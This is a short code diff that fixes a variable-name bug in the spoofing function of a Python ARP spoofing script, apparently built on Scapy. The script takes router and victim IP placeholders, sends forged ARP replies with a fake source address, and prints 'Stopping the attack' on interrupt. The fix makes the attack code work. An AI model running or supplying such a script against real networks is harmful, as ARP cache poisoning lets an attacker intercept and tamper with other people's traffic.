@@ -4,8 +4,8 @@ from time import sleep
 router_IP = "Enter the root IP"
 victim_IP = "Enter the victim IP"
 
-def spoofing(target_ip, fake_IP):
-    PKT = ARP(op=2, pdst=alvo_IP, psrc=fake_IP)
+def spoofing(target_IP, fake_IP):
+    PKT = ARP(op=2, pdst=target_IP, psrc=fake_IP)
     send(PKT, verbose=False)
 
 try:
@@ -18,3 +18,4 @@ try:
 except KeyboardInterrupt:
 
     print("Stopping the attack")
+
